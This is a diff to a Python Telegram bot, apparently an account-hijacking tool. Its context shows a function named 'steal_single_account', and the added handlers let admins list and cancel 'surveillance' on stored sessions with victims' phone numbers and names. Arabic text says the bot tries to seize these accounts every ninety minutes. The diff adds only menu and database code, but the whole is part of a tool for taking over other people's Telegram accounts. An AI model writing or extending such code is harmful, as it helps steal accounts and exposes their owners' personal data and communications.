@@ -943,6 +943,51 @@ async def steal_single_account(acc_id, admin_id):
     finally:
         if client_a.is_connected: await client_a.disconnect()
 
+@bot.callback_query_handler(func=lambda call: call.data == "manage_surveillance")
+def manage_surveillance_menu(call):
+    if call.from_user.id not in ADMIN_IDS: return
+    
+    conn = get_db_conn()
+    c = conn.cursor()
+    # جلب الحسابات التي تحت المراقبة فقط
+    c.execute("SELECT id, phone, first_name FROM sessions WHERE surveilled=1")
+    accounts = c.fetchall()
+    conn.close()
+
+    markup = InlineKeyboardMarkup()
+    if accounts:
+        markup.row(InlineKeyboardButton("🛑 إلـغـاء الـمـراقـبـة عـن الـجـمـيـع", callback_data="unsurveil:all"))
+        for acc_id, phone, name in accounts:
+            markup.row(InlineKeyboardButton(f"🛑 {name} | {phone}", callback_data=f"unsurveil:{acc_id}"))
+    else:
+        markup.row(InlineKeyboardButton("✅ لا تـوجـد حـسـابـات تـحـت الـمـراقـبـة", callback_data="none"))
+        
+    markup.row(InlineKeyboardButton("🔙 رجـوع", callback_data="back_home"))
+    
+    text = "🛂┊ **إدارة الـحـسـابـات تـحـت الـمـراقـبـة ⏳:**\n\n⎉╎ هـذه الـحـسـابـات يـحـاول الـبـوت تـهـجـيـرهـا كـل سـاعـة ونص.\n⎉╎ اضغـط عـلـى أي حـسـاب لإلـغـاء الـمـراقـبـة والـتـهـجـيـر:"
+    bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
+
+
+@bot.callback_query_handler(func=lambda call: call.data.startswith("unsurveil:"))
+def execute_unsurveil(call):
+    if call.from_user.id not in ADMIN_IDS: return
+    target = call.data.split(":")[1]
+    
+    conn = get_db_conn()
+    c = conn.cursor()
+    
+    if target == "all":
+        c.execute("UPDATE sessions SET surveilled=0 WHERE surveilled=1")
+        msg = "✅ تـم إلـغـاء الـمـراقـبـة عـن جـمـيـع الـحـسـابـات!"
+    else:
+        c.execute("UPDATE sessions SET surveilled=0 WHERE id=?", (target,))
+        msg = "✅ تـم إلـغـاء الـمـراقـبـة عـن هـذا الـحـسـاب!"
+        
+    conn.commit()
+    conn.close()
+    
+    bot.answer_callback_query(call.id, msg, show_alert=True)
+    manage_surveillance_menu(call) # تحديث القائمة فوراً بعد الحذف
 
 if __name__ == "__main__":
     logging.info("🚀 جاري إطلاق البوت...")
